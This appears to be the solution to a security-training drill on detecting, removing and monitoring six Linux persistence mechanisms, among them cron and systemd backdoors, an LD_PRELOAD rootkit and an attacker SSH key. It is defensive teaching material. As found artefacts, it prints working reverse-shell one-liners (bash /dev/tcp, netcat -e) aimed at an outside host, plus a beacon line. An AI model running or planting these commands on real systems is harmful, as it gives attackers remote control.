# Solution: Drill 01 (Advanced) — Malware Persistence Detection

## The 6 Persistence Mechanisms

### 1. Cron Job for Root (in /etc/cron.d/)

**Discovery:**

```console
cat /etc/cron.d/sysmon
# */5 * * * * root /bin/bash -i >& /dev/tcp/185.220.X.X/4444 0>&1
```

**Removal:**

```console
rm /etc/cron.d/sysmon
```

**Monitoring:**

```console
auditctl -w /etc/cron.d -p wa -k cron-persistence
```

---

### 2. SSH Authorized Key for Root

**Discovery:**

```console
cat /root/.ssh/authorized_keys
# ssh-rsa AAAA...LONGSTRING... attacker@c2-server
```

**Removal:**

```console
# Remove unauthorized key
grep -v "attacker@c2-server" /root/.ssh/authorized_keys > /tmp/clean_keys
mv /tmp/clean_keys /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Monitoring:**

```console
auditctl -w /root/.ssh/authorized_keys -p wa -k ssh-keys
auditctl -w /home -p wa -k ssh-keys
```

---

### 3. Systemd Service (Backdoor Service)

**Discovery:**

```bash
systemctl list-units --type=service --all | grep "network-monitor"
# network-monitor.service  loaded active running  Network Monitoring Service

cat /etc/systemd/system/network-monitor.service
# [Unit]
# Description=Network Monitoring Service
# After=network.target
# [Service]
# Type=simple
# ExecStart=/usr/local/bin/netmon
# Restart=always
# [Install]
# WantedBy=multi-user.target
```

And examining the binary:

```bash
cat /usr/local/bin/netmon
# #!/bin/bash
# while true; do nc -e /bin/bash 185.220.X.X 4445; sleep 60; done
```

**Removal:**

```console
systemctl stop network-monitor
systemctl disable network-monitor
rm /etc/systemd/system/network-monitor.service
rm /usr/local/bin/netmon
systemctl daemon-reload
```

**Monitoring:**

```console
auditctl -w /etc/systemd/system -p wa -k systemd-persistence
```

---

### 4. Bash Profile Backdoor

**Discovery:**

```console
cat /etc/bash.bashrc
# At the bottom:
# nohup /tmp/.x/beacon &>/dev/null &
```

**Removal:**

```console
# Remove the malicious line
grep -v "nohup /tmp/.x/beacon" /etc/bash.bashrc > /tmp/clean_bashrc
mv /tmp/clean_bashrc /etc/bash.bashrc
# Also remove the beacon binary
rm -rf /tmp/.x/
```

**Monitoring:**

```console
auditctl -w /etc/bash.bashrc -p wa -k shell-profile
auditctl -w /etc/profile -p wa -k shell-profile
```

---

### 5. LD_PRELOAD Library Rootkit

**Discovery:**

```console
cat /etc/ld.so.preload
# /usr/local/lib/libsystem.so

# The library is malicious
ls -la /usr/local/lib/libsystem.so
file /usr/local/lib/libsystem.so
# Can intercept system calls like geteuid, getuid to hide root processes
```

**Removal:**

```console
# Remove the preload entry first (otherwise the library is in memory)
echo "" > /etc/ld.so.preload
# Then remove the library
rm /usr/local/lib/libsystem.so
ldconfig
```

**Monitoring:**

```console
auditctl -w /etc/ld.so.preload -p wa -k ld-preload
```

---

### 6. User Crontab for Deployed User

**Discovery:**

```console
crontab -l -u deploy
# @reboot /home/deploy/.config/autostart.sh
cat /home/deploy/.config/autostart.sh
# #!/bin/bash
# python3 -c 'import socket,subprocess,os;s=socket.socket(...) # reverse shell
```

**Removal:**

```console
crontab -r -u deploy
rm /home/deploy/.config/autostart.sh
```

**Monitoring:**

```console
auditctl -w /var/spool/cron -p wa -k user-cron
```

---

## Complete Audit Summary

| # | Mechanism | Location | Risk | Detection Key |
|---|-----------|---------|------|--------------|
| 1 | Cron reverse shell | /etc/cron.d/sysmon | Critical | cron-persistence |
| 2 | Unauthorized SSH key | /root/.ssh/authorized_keys | Critical | ssh-keys |
| 3 | Backdoor systemd service | network-monitor.service | Critical | systemd-persistence |
| 4 | Bash profile backdoor | /etc/bash.bashrc | High | shell-profile |
| 5 | LD_PRELOAD rootkit | /etc/ld.so.preload | Critical | ld-preload |
| 6 | User crontab reverse shell | deploy's crontab | High | user-cron |

**Lesson:** APT groups use layered persistence.
Finding one mechanism doesn't mean the system is clean.
Always conduct a systematic search of ALL persistence locations.
